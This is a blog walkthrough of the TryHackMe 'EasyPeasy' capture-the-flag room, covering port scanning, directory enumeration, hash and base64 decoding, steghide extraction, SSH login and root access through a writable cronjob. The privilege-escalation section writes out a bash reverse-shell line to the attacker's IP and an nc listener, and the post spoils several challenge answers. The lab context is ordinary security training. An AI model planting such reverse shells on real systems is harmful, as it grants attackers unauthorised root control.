---
layout: post
title:  "EasyPeasy on Tryhackme"
date:   2020-10-27 10:22:00 +0200
description: "Walkthrough of Easypeasy on TryHackme"
tags: cyberchef cronjob
permalink: "/categories/:categories"
author: Zebra
image: /assets/img/thm-images/easypeasy.png
categories: tryhackme easypeasy
---

**[THM EasyPeasy Link][Easypeasylink]**

# EasyPeasy WriteUp  
## by Zebra  
    
| Room        | Date        | Difficulty | Type         | Time | Own Intention | Maschine |
| ----------- | ----------- | ---------- | ------------ | ---- | ------------- | -------- |
| Easypeasy   | 27.10.2020  | Easy       | Challange    | 2h   | Easy          | Linux    |
  
------------------------ 
  
### <ins>Tasks</ins>  
  
| Task      | Question                                                        |
| --------- | ----------------------------------------------------------------|
| Task 1.1  | How many ports are open?  
| Task 1.2  | What is the version of nginx?
| Task 1.3  | What is running on the highest port? 
| Task 2.1  | Using GoBuster, find flag 1.
| Task 2.2  | Further enumerate the machine, what is flag 2? 
| Task 2.3  | Crack the hash with easypeasy.txt, What is the flag 3?
| Task 2.4  | What is the hidden directory? 
| Task 2.5  | Using the wordlist that provided to you in this task crack the hash
|		      | what is the password? 
| Task 2.6  | What is the password to login to the machine via SSH?
| Task 2.7  | What is the user flag? 
| Task 2.8  | What is the root flag? 


## <ins>Introduction</ins>

Hello and welcome to the Write-Up of the Room “Easy Peasy” on 
tryhackme.  
First I make some directories for better structure.  
Then I check the Task, which I had to solve.  
We see, that with have a little red line to get the user and root flag.
Our Steps are:  
1. Scanning and Enumeration  
2. Exploitation  
3. Post Exploitation  
4. Priv Escalation  
  
**So let's begin:**

## <ins>Preparation Steps</ins>

> 
```bash	
mkdir EasyPeasy #New Room folder
cd EasyPeasy   	#Move into folder
mkdir nmap  	#Nmap directory
mkdir gobuster  #Gobuster directory
```
**Important: Download under Task 2 the “easypeasy.txt”!!!**

## <ins>Scanning and Enumeration</ins>

This time I use Rustscan. Rustscan is a bit faster then nmap, cause 
first it scans the open ports and do a port list and then it initialize the
specific scans.

  
<ins>Rustscan</ins>  
`rustscan 10.10.144.140 -- -A | tee ./nmap/rust_initial.txt`
> 
PORT      STATE SERVICE REASON  VERSION  
80/tcp    open  http    syn-ack nginx 1.16.1  
| http-methods:   
|_  Supported Methods: GET HEAD  
| http-robots.txt: 1 disallowed entry   
|_/  
|_http-server-header: nginx/1.16.1  
|_http-title: Welcome to nginx!  
6498/tcp  open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
65524/tcp open  http    syn-ack Apache httpd 2.4.43 ((Ubuntu))  
| http-methods:   
|_  Supported Methods: POST OPTIONS HEAD GET  
| http-robots.txt: 1 disallowed entry   
|_/  
|_http-server-header: Apache/2.4.43 (Ubuntu)  
|_http-title: Apache2 Debian Default Page: It works  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel    
  
  
We see that we have 3 Ports on the board whit different hints.  
This would be shown cause of `$nmap -sC #Script detection` `-sV #Version detection` `-O #Os detection`
(for the inclusion of all these switches use $nmap -A)
>
<ins>2 x Webserver:</ins>  
80/tcp - Nginx 1.16.1; robots.txt;  
65524/tcp - Apache 2.4.43;   
>  
<ins>1x ssh:</ins>  
6498/tcp,With Priv Keys;  
  
###
**Task 1.1 -1.3 solved**
###

---
  
## <ins>Webserver Enumeration</ins>

We found 2 web-servers so we could run our standard procedures
for webserver enumeration:  
  
### <ins>#Server on Port 80:</ins>  
  
Check the robots.txt: 
>Nothing interesting.   
  
<ins>So start a Gobuster Scan:</ins>  
For this operation i often use the common.txt or the small to medium directory list of standard kali wordlists.  

`gobuster dir -u http://'machine-ip' -w /usr/share/dirb/wordlists/common.txt`  
  
→ We find the directory **"/hidden"**     
>
So go to `http://ip/hidden` and check the Page. Put Ctrl+U for Check the Source-Code of the
Page. But nothing interesting there.  
  
We start another Gobuster scan on   
`gobuster dir -u http://'machine-ip'/hidden -w /usr/share/dirb/wordlists/common.txt`
    
→ Check! Another directory called **“/whatever”**  
>  
If you have a look to your taskbar you see the title “dead end”. This could be a hint for
another gobuster scan on /hidden/whatever.

But before we leave, lets check the source code again.  
  
→ Check: **“<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>”** would give us an interesting
string which ends with ==.  
>
“==” is often a base64 string. 

We could decode this with `echo -e ZmxhZ3tmMXJzN19mbDRnfQ== | base64 -d`  
(You could check the string on “Cyberchef” too).  
  
###  
**Task 2.1 solved**  
###  

---  
  
## <ins>Checking the pictures:</ins>  
  
Let's download the two pictures:   
One from /hidden and the another from /hidden/whatever
to check if there any hidden files in the images.  
  
`wget 'picture links in the source code'`  
  
Check with steghide:  
  
`steghide extract -sf image.jpg`  
>
→ Both need password and we don't have one. So put this away to don't lost time.

We don't have any hints so the second webserver will be our target

---  
  
## <ins>Webserver on port <b>65524</b></ins> 

  
Visit http://ip:65524/robots.txt  
  
We find:  
     
→ User-Agent:a18672860d0510e5ab6699730763b250 
>
This Flag Can Enter But Only This Flag No More Exceptions
Alway when i find a string i check if it could be a hash.

<ins>Check for hash:</ins>   
  
`hash-identifier and check “a18672860d0510e5ab6699730763b250”`  
  
<center><p><img src="/images/easypeasy_hash1.png" /></p></center>  
  
>
Its an MD5 hash.  
Crack it. I try it with hashcat but i get nothing. Some googling around i solved it with
MD5hashing and get flag.  

###  
**Task 2.2 solved**  
###   
  
--------------------------------------

The following step after robots.txt is, checking the actual page and the source code.    
If we look through the code and search for words like “username”,"user", “password”, "pass"
and “flag”.  

→ We find the flag for Task 2.3
  
###    
**Task 2.3 solved**    
###  
  
---  
  
When we think about our first website Scanning we recognized that a hidden file was
placed between a string called `<p hidden>` so we will search for this to.  

→ And check! `<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>`.    
   We find “ba....:ObsJmP173N2X6dOrAgEAL0Vu”.  
     
>
And what we will do, when we find a string?!     
Check for decryption. We se “bas....:” so it could be a “base..” format.    
  
Check on Cyberchef.  
>
Put in the string “ObsJmP173N2X6dOrAgEAL0Vu” and try all “from base..”.
You get a hit and find the hidden directory.  
  
<center><p><img src="/images/easypeasy_cyber1.png" /></p></center>  
  
###    
**Task 2.4 solved**    
###  
  
---  
  
Visit `http://ip:65542/n0**********` and check source code.  
  
→ We see that there are two .jpg files. One with no link out of the internet and the name
“binarycodepixabay.jpg”. **Download this with `wget`**.  

  
But another interesting thing there. Another long **string** under the jpg.  

> 
Same procedure with every string -> identify   
  
`hash-identifier : SHA-256`  
  
>
Crack with MD5hashing; with hashcat no fast chance.
  
###    
**Task 2.5 solved**    
###  
  
---  

<ins>Extract with steghide</ins>  

`steghide extract -sf image.jpg`    
  
   
Use the password we find in Task 2.5. 
>
Why this? Cause the string was on the same page and under the jpp image.    
    
→ We get a secrettext.txt file with content.
  
`Username: Boring`  
`Password: Binary code` 
>  
Crack Binary to ascii.  

Use Cyberchef or use   
`echo -e binary code without spaces” | perl -lpe '$_=pack"B*",$_'`  

###    
**Task 2.6 solved**    
### 
  
---  
  
In Task 2.6 we had **credentials for ssh**:
>  
shh with specific Port (find with rustscan)  
  
`ssh boring@IP -p 6498`  

>  
Grep the userfile with $ls and $cat user.txt
  
###    
**Task 2.6 solved**    
### 
  
--- 
  
## <ins>Priv Escalation Enumeration</ins>

  
`sudo -l`
> nothing 
   
`$find / -perm -u=s -type f 2>/dev/null`
> nothing 
  
`cat /etc/crontab` 
  
→ Check: .mysecretcronjob.sh


<ins>Privesc with cronjob:</ins>  
  
We find the cronjob with /var/www/.mysecretcronjob.sh.  
Place a **reverse shell** with nano.  
  
`bash -i >& /dev/tcp/'my-own-ip'/4444 0>&1`

<ins>Start listener and wait</ins>  
  
`nc -lnvp 4444`  
  
>  
(You can check if the .sh works with ./.mysecretcronjob.sh.  
But it will be only a normal shell cause boring executed it)
  
→ Check: ROOT Shell  
  
`cat /root/root.txt`
Last Task 2.8 with root.txt
  
###    
**Task 2.7 solved**    
### 

>
Summary: For the most of the hash cracking operations at tryhackme or hackthebox
I use the cracking pages at the internet. Because other users can crack the password
before and you saved a lot of time and resources. In any machines you cannot solve
the cracking operation with a specific password list or brute force over a long time.
  
So here are some links for cracking sites:  
  
[Crackstation](https://crackstation.net/)  
[Hash-analyzer](https://www.tunnelsup.com/hash-analyzer/)  
[Cyberchef](https://gchq.github.io/CyberChef/)  
[MD5 hasching](https://md5hashing.net/)  
  
---  
  
[Easypeasylink]: https://tryhackme.com/room/easypeasyctf
